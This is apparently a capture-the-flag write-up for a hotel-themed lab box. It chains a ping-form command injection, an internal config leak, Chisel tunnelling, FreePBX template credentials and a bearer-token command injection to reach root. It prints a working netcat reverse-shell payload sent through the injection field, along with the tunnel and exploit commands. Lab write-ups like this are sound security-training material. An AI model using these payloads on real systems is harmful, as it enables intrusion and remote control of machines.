# Day 11 — Infinity Pool

## Summary

No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.

## Objective

Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.

## Tools / Techniques / Threat Vectors

- Nmap & Gobuster enumeration
- OS command injection (unauthenticated + authenticated)
- Reverse shell via Penelope
- Internal service discovery through process listing (`ps aux`)
- Config/credential leakage through an internal API
- Chisel reverse port forwarding for local-only web app access
- FreePBX UCP hard-coded template credentials (CVE-2026-46376)
- Bearer-token authenticated command injection leading to root

---

## Steps Taken

1. I'm greeted with a web page, so before touching anything I inspect the page source and the browser's Network tab to see what resources are actually being requested and rendered. That habit pays off almost immediately.

    ![Day 11 Screenshot 1](image1.png)
    ![Day 11 Screenshot 2](image2.png)

    From there I run my usual enumeration pass against the target:

    ```bash
    nmap -sT -sV -sC <IP-ADDRESS> -oN nmap.txt
    gobuster dir -u "http://<IP-ADDRESS>/" -w /usr/share/wordlists/dirb/common.txt
    ```

    Nmap comes back with port 22 (SSH) open, but since this is a web category challenge I don't sink time into it. Gobuster is more useful here — it turns up two things worth chasing: **robots.txt** and **status**.

    ![Day 11 Screenshot 3](image3.png)

2. Before jumping into either of those, I check `/static/app.js` and `/static/style.css`, since I noticed the page was pulling them in before I ever hit robots.txt or /status.

    ![Day 11 Screenshot 4](image4.png)

    `app.js` turns out to be mostly a red herring — just a `console.log` comment — but it does confirm that `/status` is meant to be reachable, which lines up with what robots.txt is about to tell me. Speaking of which, robots.txt reads:

    ```text
    User-agent: *
    Disallow: /internal/
    Disallow: /status
    ```

    Anything a robots.txt file explicitly tells me *not* to look at is exactly where I look next.

    **/status directory**

    ![Day 11 Screenshot 5](image5.png)

    This page presents itself as a "sister-property connectivity" checker — it takes an IP address and pings it. I plug in my attacker IP just to see what happens, and sure enough, I get back a normal `ping` echo response rendered on the page.

    ![Day 11 Screenshot 6](image6.png)

    That's my cue to test for command injection. If this page is genuinely shelling out to `ping` behind the scenes, I should be able to break out of that command and chain my own. I try appending a semicolon followed by a harmless test command:

    `; echo "hello"` and then `; whoami`

    ![Day 11 Screenshot 7](image7.png)

3. Both come back clean — no filtering, no sanitization. At this point I know I can weaponize this input field, so I set up a Penelope listener and fire off a reverse shell payload through the same injection point:

    ```bash
    ; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP-ADDRESS> 4444 >/tmp/f
    ```

    ![Day 11 Screenshot 8](image8.png)

    Shell in hand, I run `whoami` to confirm my landing user, then head to that user's home directory to grab the user flag.

    ![Day 11 Screenshot 9](image9.png)

4. With the user flag secured, I turn my attention to root. Stepping one directory up from where I landed, I find two more directories sitting right alongside the one I initially exploited: `automation` and `watchtower`.

    ![Day 11 Screenshot 10](image10.png)

    Neither is readable as my current user, but a quick look at running processes tells me exactly why they matter — both are backing live services:

    ![Day 11 Screenshot 11](image11.png)

    - `automation` is running as **root**, bound to `127.0.0.1:9000`
    - `watchtower` is running as `svc-watch`, bound to `127.0.0.1:3000`

    Both are loopback-only, but I'm already on the box, so that's not a barrier. I curl each one directly:

    ```bash
    curl -s http://127.0.0.1:3000/
    curl -s http://127.0.0.1:9000/
    ```

    ![Day 11 Screenshot 12](image12.png)

    Port 9000 gives me nothing useful yet, but port 3000 answers with a full HTML page describing itself as "Watchtower — ops console," and conveniently lists its own endpoints: `/api/health` and `/api/config`. I go straight for `/api/config`.

    ![Day 11 Screenshot 13](image13.png)

5. That config leak is the real turning point. It hands me credentials for a third internal service — a telephony portal on port 8080:

    ```text
    telephony_portal: http://127.0.0.1:8080/ucp
    telephony_user:   FreePBXUCPTemplateCreator
    telephony_pass:   St4yN0t1c3d_2026
    ```

    A curl to that path confirms it's a FreePBX User Control Panel login page. Rather than fight through a login flow blind over curl, I decide it's worth getting real browser access to this internal service, so I pivot to Chisel:

    - On my attacker box, I start a Chisel server in reverse mode: `./chisel server -p 8000 --reverse`
    - I drop a matching Chisel client binary onto the target through my existing shell and connect it back: `./chisel client <attacker-ip>:8000 R:8080:127.0.0.1:8080`

    With the tunnel up, `http://127.0.0.1:8080/ucp` in my own browser now transparently reaches the target's internal-only FreePBX instance. I log in with the leaked credentials and I'm in.

    ![Day 11 Screenshot 14](image14.png)
    ![Day 11 Screenshot 15](image15.png)

    Worth noting for the record: those "leaked" credentials aren't just a lucky find specific to this box — `FreePBXUCPTemplateCreator` is a real, publicly known hard-coded template account (CVE-2026-46376), left active on any FreePBX deployment where the admin never rotated it after enabling the UCP generic template setup. The box even hints at this directly — the config leak includes a note reading *"UCP still on default template creds — ROTATE."*

6. Once inside UCP, I start clicking through everything the account can see. Adding more Dashboard Widgets eventually surfaces something the interface wasn't obviously advertising: a **bearer token**, tucked away as an "Automation Key."

    ![Day 11 Screenshot 16](image17.png)
    ![Day 11 Screenshot 17](image16.png)

    That name is a direct callback to the root-owned `automation` service sitting on port 9000 — the one that gave me nothing on an unauthenticated request earlier. Hitting `/health` on that service (rather than my earlier guess of `/api/health`) finally returns something:

    ```json
    {
      "endpoints": {
        "GET /health": "service status",
        "POST /jobs/export": {
          "auth": "Authorization: Bearer <automation key>",
          "body": {"report": "<report name>"},
          "desc": "archive the latest data export"
        }
      },
      "runs_as": "root",
      "service": "automation",
      "status": "ok"
    }
    ```

    ![Day 11 Screenshot 18](image18.png)

    Now I have everything I need: an endpoint, a required header, and the token to satisfy it. I send a POST request to `/jobs/export`:

    ```bash
    curl -s -X POST \
      -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
      -H "Content-Type: application/json" \
      -d '{"report": "root"}' \
      http://127.0.0.1:9000/jobs/export
    ```

    The response doesn't just confirm success — it echoes back the exact shell command being executed server-side:

    ```
    tar czf /var/automation/exports/root.tgz /var/automation/data
    ```

    That's my `report` value dropped straight into a shell command with zero sanitization. Since the service builds this as a raw shell string, I can break out with a semicolon and comment out the rest of the line with `#`. I confirm code execution first with a harmless `id` call, see it come back as root, and then swap the payload for a reverse shell one-liner.

    ![Day 11 Screenshot 19](image19.png)

    With a root shell landed, I stabilize it with a quick PTY upgrade, head to `/root/`, and cat out `root.txt`.

    ![Day 11 Screenshot 20](image20.png)

---

## What I Learned

This box was a good reminder that a "no visible edge" hint is usually pointing you toward services that only exist on loopback — the real attack surface here was never the public-facing site itself, it was the chain of internal apps talking to each other behind it, discoverable only once I already had a foothold and could run `ps aux`. Each service leaked just enough to reach the next one: the ping field got me a shell, the shell let me see `watchtower` and `automation` as processes, `watchtower`'s config endpoint leaked FreePBX credentials, FreePBX's UCP handed me a bearer token, and that token unlocked a root-owned automation endpoint with the exact same unsanitized command-injection pattern I'd already exploited once at the very start. It also reinforced two habits worth keeping: don't stop enumerating a service just because the obvious paths 404 — `/health` existed right next to the `/api/health` guess that failed — and when real-world CVEs show up in a lab (like the FreePBX hard-coded template creds), it's worth pausing to actually read the advisory, since it usually explains *why* the vulnerability exists rather than just confirming that it does.